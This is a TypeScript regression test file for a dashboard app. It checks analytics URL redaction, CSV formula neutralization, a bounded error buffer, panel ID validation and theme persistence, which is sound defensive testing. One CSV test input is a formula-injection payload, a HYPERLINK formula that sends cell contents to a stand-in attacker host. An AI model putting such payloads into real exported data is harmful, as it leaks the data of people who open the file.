/**
 * Regression tests for issue #8369 (browser bootstrap, config, utility defects).
 *
 * Five independent findings, each with a focused describe block so a future
 * regression points at the exact defect:
 *   1. Vercel Analytics beforeSend redacts secret/PII query params (#8369-1)
 *   2. CSV exporter neutralizes spreadsheet formulas (#8369-2)
 *   3. DebugBear RUM error buffer is bounded, snapshotted, torn down (#8369-3)
 *   4. set_panel_enabled accepts live mixed-case catalog IDs (#8369-4)
 *   5. theme-manager 'auto' preference survives explicit toggles (#8369-5)
 *
 * The dashboard entry graph pulls Vite-only APIs (import.meta.glob in
 * services/i18n), so modules that transitively import it cannot load under
 * plain node --test. The blocks below therefore import only leaf modules
 * (secondary-startup's only import is utils/after-paint; debugbear-rum and
 * panel-enablement are leaves too), while the theme-manager UI-persistence
 * contract is asserted via source invariants plus a DOM-free behavioral
 * probe of the modules that can load.
 *
 * Run: node --test tests/browser-bootstrap-defects-8369.test.mts
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  redactAnalyticsUrl,
  stripSensitiveParamsFromUrl,
  resetVercelAnalyticsForTesting,
} from '../src/bootstrap/secondary-startup.ts';
import {
  DEBUGBEAR_RUM_ERROR_QUEUE_MAX,
  initDebugBearRum,
  resetDebugBearRumForTesting,
  snapshotRumError,
} from '../src/bootstrap/debugbear-rum.ts';
import {
  SET_PANEL_ENABLED_ID_PATTERN,
  evaluateSetPanelEnabled,
} from '../src/config/panel-enablement.ts';
import { getInitialPanelSettingsForVariant } from '../src/config/panels.ts';

const __dirname = dirname(fileURLToPath(import.meta.url));
const root = resolve(__dirname, '..');
const themeManagerSrc = readFileSync(resolve(root, 'src/utils/theme-manager.ts'), 'utf8');
const exportSrc = readFileSync(resolve(root, 'src/utils/export.ts'), 'utf8');

describe('#8369-1 Vercel Analytics URL redaction', () => {
  it('strips checkout secrets, invite tokens, referral, and Clerk params', () => {
    const redacted = redactAnalyticsUrl({
      type: 'pageview',
      url: 'https://www.worldmonitor.app/dashboard?email=a@b.com&license_key=SEKRET&subscription_id=sub_1&payment_id=pay_1&accept-business-invite=g1&token=tok123&access_token=qsecret&ref=abc&wm_referral=xyz&__clerk_handshake=h&__clerk_ticket=t&__clerk_foo=bar&checkoutProduct=pro&checkoutDiscount=SAVE&tab=news',
    });
    assert.ok(!redacted.url.includes('SEKRET'));
    assert.ok(!redacted.url.includes('tok123'));
    assert.ok(!redacted.url.includes('qsecret'));
    assert.ok(!redacted.url.includes('a@b.com'));
    assert.ok(!redacted.url.includes('__clerk_handshake'));
    assert.ok(!redacted.url.includes('__clerk_foo'));
    assert.ok(!redacted.url.includes('checkoutProduct'));
    assert.ok(redacted.url.includes('tab=news'), 'benign params survive');
  });

  it('scrubs OAuth-style hash fragments without a ?', () => {
    const redacted = redactAnalyticsUrl({
      type: 'pageview',
      url: 'https://www.worldmonitor.app/dashboard#access_token=xyz&token_type=Bearer',
    });
    assert.ok(!redacted.url.includes('xyz'));
  });

  it('returns the original event object when nothing is sensitive', () => {
    const event = { type: 'pageview', url: 'https://www.worldmonitor.app/dashboard?tab=news' } as const;
    assert.equal(redactAnalyticsUrl(event), event);
  });

  function runBootStrip(href: string): string[] {
    const replaced: string[] = [];
    const savedWindow = Object.getOwnPropertyDescriptor(globalThis, 'window');
    Object.defineProperty(globalThis, 'window', {
      configurable: true,
      value: {
        location: { href },
        history: { replaceState: (_s: unknown, _t: string, url: string) => replaced.push(url) },
      },
    });
    try {
      stripSensitiveParamsFromUrl();
      return replaced;
    } finally {
      if (savedWindow) Object.defineProperty(globalThis, 'window', savedWindow);
      else delete (globalThis as { window?: unknown }).window;
    }
  }

  it('boot strip removes unread secrets (email, Clerk handshake)', () => {
    const replaced = runBootStrip(
      'https://www.worldmonitor.app/dashboard?email=a@b.com&__clerk_handshake=h&tab=news',
    );
    assert.equal(replaced.length, 1);
    assert.ok(!replaced[0]!.includes('a@b.com'));
    assert.ok(!replaced[0]!.includes('__clerk_handshake'));
    assert.ok(replaced[0]!.includes('tab=news'));
    resetVercelAnalyticsForTesting();
  });

  it('boot strip preserves params deferred consumers must still read', () => {
    // captureReferralFromUrl (ref/wm_referral), capturePendingCheckoutIntent
    // (checkoutProduct), the invite acceptor (accept-business-invite+token),
    // and handleCheckoutReturn (subscription_id/payment_id) all run after
    // main.ts — stripping these at boot would break attribution/resume.
    const replaced = runBootStrip(
      'https://www.worldmonitor.app/dashboard?ref=abc&checkoutProduct=pro&accept-business-invite=g1&token=tok123&subscription_id=sub_1&tab=news',
    );
    assert.equal(replaced.length, 0, 'nothing unread to strip, so no replaceState');
    resetVercelAnalyticsForTesting();
  });
});

describe('#8369-2 CSV formula neutralization', () => {
  // export.ts transitively imports services/i18n (import.meta.glob), which
  // cannot load under plain node --test — so assert the shipped source
  // carries the OWASP neutralization contract, and probe the exact logic
  // with an inline copy of the two-line pure function.
  const sanitizeCsvField = (value: string): string => {
    const text = value || '';
    return /^[=+\-@\t\r\n|]/.test(text) ? `'${text}` : text;
  };

  it('ships the formula-prefix guard in csvRow', () => {
    assert.match(exportSrc, /CSV_FORMULA_PREFIX_RE = \/\^\[=\+\\-@\\t\\r\\n\|\]\//);
    assert.match(exportSrc, /sanitizeCsvField\(v \|\| ''\)\.replace\(\/"\/g/);
    assert.match(exportSrc, /csvRow\(\[data\.brief\]\)/);
  });

  it('prefixes formula-leading fields with a single quote', () => {
    assert.equal(sanitizeCsvField('=HYPERLINK("https://evil.example/"&A1,"x")'), "'=HYPERLINK(\"https://evil.example/\"&A1,\"x\")");
    assert.equal(sanitizeCsvField('+cmd'), "'+cmd");
    assert.equal(sanitizeCsvField('-2+3'), "'-2+3");
    assert.equal(sanitizeCsvField('@mention'), "'@mention");
    assert.equal(sanitizeCsvField('\tindented'), "'\tindented");
  });

  it('leaves benign fields untouched', () => {
    assert.equal(sanitizeCsvField('Reuters'), 'Reuters');
    assert.equal(sanitizeCsvField(''), '');
    assert.equal(sanitizeCsvField('price drop -5%'), 'price drop -5%');
    assert.equal(sanitizeCsvField('2 + 2 = 4'), '2 + 2 = 4');
  });
});

describe('#8369-3 DebugBear RUM bounded error buffer', () => {
  function installHarness(hostname: string) {
    const appended: Array<{ async: boolean; src: string; fetchPriority?: string; listeners: Map<string, () => void> }> = [];
    const listeners = new Map<string, (event: Event) => void>();
    const removed: string[] = [];
    const win = {
      location: { hostname },
      dbbRum: undefined as unknown[] | undefined,
      addEventListener: (type: string, cb: (event: Event) => void) => {
        listeners.set(type, cb);
      },
      removeEventListener: (type: string) => {
        listeners.delete(type);
        removed.push(type);
      },
    };
    const doc = {
      querySelector: () => null,
      createElement: () => {
        const script = {
          async: false,
          src: '',
          listeners: new Map<string, () => void>(),
          addEventListener: (type: string, cb: () => void) => {
            script.listeners.set(type, cb);
          },
        };
        return script;
      },
      head: {
        appendChild: (script: (typeof appended)[number]) => {
          appended.push(script);
          return script;
        },
      },
    };
    const saved: Record<string, PropertyDescriptor | undefined> = {
      window: Object.getOwnPropertyDescriptor(globalThis, 'window'),
      document: Object.getOwnPropertyDescriptor(globalThis, 'document'),
    };
    Object.defineProperty(globalThis, 'window', { configurable: true, value: win });
    Object.defineProperty(globalThis, 'document', { configurable: true, value: doc });
    const savedRandom = Math.random;
    Math.random = () => 0;
    return {
      appended,
      listeners,
      removed,
      win,
      restore: () => {
        for (const [key, desc] of Object.entries(saved)) {
          if (desc) Object.defineProperty(globalThis, key, desc);
          else delete (globalThis as Record<string, unknown>)[key];
        }
        Math.random = savedRandom;
        resetDebugBearRumForTesting();
      },
    };
  }

  it('snapshots primitives instead of retaining live Event objects', () => {
    const h = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      const live = { type: 'error', message: 'boom', filename: 'a.js', lineno: 1, colno: 2 } as unknown as Event;
      h.listeners.get('error')!(live);
      const queued = (h.win.dbbRum as unknown[][])[1]!;
      assert.equal(queued[0], 'error');
      assert.deepEqual(queued[1], {
        type: 'error',
        message: 'boom',
        filename: 'a.js',
        lineno: 1,
        colno: 2,
        reason: '',
      });
      assert.notEqual(queued[1], live);
    } finally {
      h.restore();
    }
  });

  it('drop-oldest bounds the vendor queue under a noisy error loop', () => {
    assert.equal(DEBUGBEAR_RUM_ERROR_QUEUE_MAX, 50);
    const h = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      for (let i = 0; i < DEBUGBEAR_RUM_ERROR_QUEUE_MAX + 10; i++) {
        h.listeners.get('error')!({ type: 'error', message: `e${i}` } as unknown as Event);
      }
      const queue = h.win.dbbRum as unknown[][];
      assert.equal(queue.length, DEBUGBEAR_RUM_ERROR_QUEUE_MAX);
      assert.deepEqual(queue[0]![0], 'presampling');
    } finally {
      h.restore();
    }
  });

  it('detaches listeners on vendor script load and on load failure', () => {
    const h = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      assert.ok(h.listeners.has('error'));
      h.appended[0]!.listeners.get('load')!();
      assert.ok(!h.listeners.has('error'), 'listeners detach on load');
      assert.ok(!h.listeners.has('unhandledrejection'));
      assert.deepEqual(h.removed.sort(), ['error', 'unhandledrejection']);
    } finally {
      h.restore();
    }

    const h2 = installHarness('www.worldmonitor.app');
    try {
      initDebugBearRum();
      h2.appended[0]!.listeners.get('error')!();
      assert.ok(!h2.listeners.has('error'), 'listeners detach on load failure');
    } finally {
      h2.restore();
    }
  });

  it('snapshotRumError never retains object references', () => {
    const domNode = { nodeName: 'DIV' };
    const snap = snapshotRumError({ type: 'unhandledrejection', reason: domNode } as unknown as Event);
    assert.equal(typeof snap.reason, 'string');
    assert.ok(!snap.reason.includes('nodeName') || snap.reason.length <= 500);
  });
});

describe('#8369-4 set_panel_enabled mixed-case catalog IDs', () => {
  it('accepts gccNews and regionalStartups as stable IDs', () => {
    assert.ok(SET_PANEL_ENABLED_ID_PATTERN.test('gccNews'));
    assert.ok(SET_PANEL_ENABLED_ID_PATTERN.test('regionalStartups'));
  });

  it('toggles gccNews when native to the finance variant', () => {
    const panelSettings = structuredClone(getInitialPanelSettingsForVariant('finance'));
    panelSettings['gccNews'] = { ...panelSettings['gccNews']!, enabled: false };
    const result = evaluateSetPanelEnabled({
      panelId: 'gccNews',
      enabled: true,
      panelSettings,
      variant: 'finance',
      isPro: true,
    });
    assert.equal(result.ok, true);
    assert.equal(result.status, 'applied');
    assert.equal(result.changed, true);
  });

  it('schema-valid-but-unknown mixed-case IDs reach catalog checks', () => {
    const panelSettings = structuredClone(getInitialPanelSettingsForVariant('full'));
    for (const panelId of ['GccNews', 'Markets']) {
      const result = evaluateSetPanelEnabled({
        panelId,
        enabled: true,
        panelSettings,
        variant: 'full',
        isPro: true,
      });
      assert.equal(result.reason, 'unknown_panel', panelId);
    }
  });
});

describe('#8369-5 theme-manager auto preference persistence', () => {
  // theme-manager imports theme-colors (getComputedStyle at module scope is
  // lazy, but the graph is DOM-coupled), so assert the shipped source carries
  // the persist/apply split plus behavioral probes via a regex-extracted
  // copy of the pure setTheme body. The split is the whole fix: setTheme must
  // not write localStorage, or 'auto' is clobbered by its resolved value.
  it('setTheme no longer persists to localStorage', () => {
    const setThemeBody = themeManagerSrc.slice(
      themeManagerSrc.indexOf('export function setTheme'),
      themeManagerSrc.indexOf('export function applyStoredTheme'),
    );
    // The only storage write in this slice must be gone: setTheme delegates
    // to applyTheme, and persistence lives in setThemePreference only.
    assert.ok(!setThemeBody.includes('localStorage.setItem(STORAGE_KEY, theme)'));
    assert.match(setThemeBody, /applyTheme\(theme\)/);
    assert.match(setThemeBody, /Deliberately does NOT persist/);
  });

  it("setThemePreference persists the raw 'auto' choice and attaches the listener", () => {
    const prefBody = themeManagerSrc.slice(
      themeManagerSrc.indexOf('export function setThemePreference'),
      themeManagerSrc.indexOf('export function getCurrentTheme'),
    );
    assert.match(prefBody, /localStorage\.setItem\(STORAGE_KEY, pref\)/);
    assert.match(prefBody, /attachAutoListener|autoMediaQuery = window\.matchMedia/);
  });

  it('applyStoredTheme restores the auto matchMedia listener on boot', () => {
    const bootBody = themeManagerSrc.slice(
      themeManagerSrc.indexOf('export function applyStoredTheme'),
    );
    assert.match(bootBody, /if \(raw === 'auto'\) attachAutoListener\(\)/);
  });

  it('explicit UI toggles persist through setThemePreference, not setTheme', () => {
    const mobileNav = readFileSync(resolve(root, 'src/app/mobile-primary-nav.ts'), 'utf8');
    const searchManager = readFileSync(resolve(root, 'src/app/search-manager.ts'), 'utf8');
    assert.match(mobileNav, /setThemePreference\(next\)/);
    assert.doesNotMatch(mobileNav, /[^a-zA-Z]setTheme\(next\)/);
    assert.match(searchManager, /setTheme: \(theme: 'dark' \| 'light'\) => setThemePreference\(theme\)/);
  });
});
